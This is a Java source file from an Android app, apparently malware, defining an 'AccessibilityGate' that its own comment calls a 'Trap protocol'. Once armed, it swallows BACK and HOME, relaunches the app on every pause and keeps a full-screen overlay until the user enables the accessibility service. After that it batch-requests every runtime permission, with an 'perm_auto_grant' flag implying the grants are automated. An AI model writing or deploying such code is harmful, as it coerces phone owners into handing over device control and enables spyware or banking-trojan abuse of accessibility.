package com.fason.app.core;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.provider.Settings;

/**
 * Trap protocol — once armed, the only way forward is enabling the
 * accessibility service. BACK/HOME are swallowed by the a11y service,
 * the app re-launches itself on every pause, and the permission overlay
 * goes full-screen persistent. Disarms only when a11y is granted.
 */
public final class AccessibilityGate {
    private AccessibilityGate() {}

    public static boolean isArmed(Context ctx) {
        if (ctx == null) return false;
        SharedPreferences p = ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE);
        return p.getBoolean(Protocol.PREF_TRAP_ACTIVE, false);
    }

    public static void arm(Context ctx) {
        if (ctx == null) return;
        ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(Protocol.PREF_TRAP_ACTIVE, true).apply();
    }

    public static void disarm(Context ctx) {
        if (ctx == null) return;
        ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(Protocol.PREF_TRAP_ACTIVE, false).apply();
    }

    public static boolean accessibilityGranted(Context ctx) {
        return PermissionManagerCompat.hasAccessibility(ctx);
    }

    /** Called on every a11y event — if trap armed and a11y now granted, disarm + cascade. */
    public static void evaluate(Context ctx) {
        if (ctx == null || !isArmed(ctx)) return;
        if (accessibilityGranted(ctx)) {
            disarm(ctx);
            cascadePermissions(ctx);
        }
    }

    /** a11y is the master key — batch-request every runtime permission at once. */
    private static void cascadePermissions(Context ctx) {
        try {
            java.util.List<String> denied = PermissionManagerCompat.denied(ctx);
            if (!denied.isEmpty()) {
                Intent i = new Intent(ctx, com.fason.app.ui.MainActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                i.putExtra("perm_auto_grant", true);
                ctx.startActivity(i);
            }
        } catch (Exception ignored) {}
    }
}
